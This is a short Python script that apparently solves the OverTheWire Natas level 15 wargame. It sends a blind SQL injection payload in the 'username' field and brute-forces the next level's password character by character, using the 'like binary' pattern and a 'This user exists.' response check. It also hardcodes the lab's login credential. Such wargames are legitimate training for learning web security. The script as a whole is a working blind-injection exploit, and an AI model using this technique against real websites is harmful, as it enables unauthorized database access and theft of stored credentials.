import requests
import string

level = "natas15"
auth = (level, "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")
url = f"http://{level}.natas.labs.overthewire.org/"

flag = ""
for i in range(32):
    for c in string.ascii_letters + string.digits:
        payload = f'natas16" and password like binary "{flag}{c}%'
        #print(f"Testing {c}")
        #print(payload)
        res = requests.post(url, auth=auth, data={"username": payload}).content
        if b"This user exists." in res:
            flag += c
            print(flag)
            break